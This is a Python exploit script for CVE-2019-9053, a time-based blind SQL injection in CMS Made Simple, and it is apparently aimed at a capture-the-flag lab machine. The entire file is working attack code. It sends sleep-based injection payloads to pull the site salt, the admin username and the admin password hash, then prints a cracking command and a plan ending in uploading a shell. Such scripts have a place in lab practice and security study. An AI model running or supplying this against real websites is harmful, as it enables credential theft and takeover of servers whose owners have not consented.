#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# CVE-2019-9053 CMS Made Simple <= 2.2.9 SQLi (Python3, no deps)
# 2026 / rebuild by timkarov / https://github.com/tim-karov
# Usage: python3 cmsms-sqli.py

import requests
import time
import sys
import hashlib
from urllib.parse import quote

def print_colored(text, color='white'):
    colors = {'green': '\033[92m', 'red': '\033[91m', 'yellow': '\033[93m', 'cyan': '\033[96m', 'end': '\033[0m'}
    print(colors.get(color, '') + text + colors['end'])

if len(sys.argv) != 2:
    print("[+] Usage: python3 {} http://10.129.75.153/writeup/".format(sys.argv[0]))
    sys.exit(1)

target = sys.argv[1].rstrip('/') + '/moduleinterface.php?mact=News,m1_,default,0'
s = requests.Session()
chars = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
TIME = 2
timeout = 15

print_colored("[+] CVE-2019-9053 CMS Made Simple SQLi (Python3)", 'cyan')
print_colored("[+] Target: {}".format(target), 'yellow')

def blind_extract(payload_func, desc, max_len=40):
    result = ''
    print_colored("[+] Dumping {}...".format(desc), 'green')
    for pos in range(max_len):
        found = False
        for c in chars:
            test = result + c
            start = time.time()
            try:
                r = s.get(target + payload_func(test), timeout=timeout)
                elapsed = time.time() - start
                if elapsed >= TIME:
                    result = test
                    print('{:.<30}'.format(result), end='', flush=True)
                    found = True
                    break
            except:
                pass
        if not found:
            print()
            break
    print()
    return result

# 1. Salt (sitemask from cms_siteprefs)
def salt_payload(t):
    hex_t = ''.join(f'{ord(ch):02x}' for ch in t)
    return f"&m1_idlist=a,b,1,5))+and+(select+sleep({TIME})+from+cms_siteprefs+where+sitepref_value+like+0x{hex_t}25+and+sitepref_name+like+0x736974656d61736b)+--+"

salt = blind_extract(salt_payload, 'SALT')
print_colored(f"[+] Salt: {salt}", 'green')

# 2. Username (cms_users.user_id=1)
def user_payload(t):
    hex_t = ''.join(f'{ord(ch):02x}' for ch in t)
    return f"&m1_idlist=a,b,1,5))+and+(select+sleep({TIME})+from+cms_users+where+username+like+0x{hex_t}25+and+user_id+like+0x31)+--+"

username = blind_extract(user_payload, 'USERNAME')
print_colored(f"[+] Username: {username}", 'green')

# 3. Password MD5
def pass_payload(t):
    hex_t = ''.join(f'{ord(ch):02x}' for ch in t)
    return f"&m1_idlist=a,b,1,5))+and+(select+sleep({TIME})+from+cms_users+where+password+like+0x{hex_t}25+and+user_id+like+0x31)+--+"

md5_hash = blind_extract(pass_payload, 'PASSWORD MD5')
print_colored(f"[+] MD5 Hash: {md5_hash}", 'green')

print_colored("\n[+] SUMMARY:", 'cyan')
print_colored(f"    Username: {username}", 'yellow')
print_colored(f"    MD5: {md5_hash} (crack: hashcat -m 0 '{md5_hash}' '{salt}' rockyou.txt)", 'yellow')
print_colored(f"    HTTP Auth /writeup/admin/: {username}:{md5_hash[:8]} (crack first!)", 'red')
print_colored("\n[+] Next: Crack MD5(salt+pass) -> Login admin -> Upload shell", 'green')
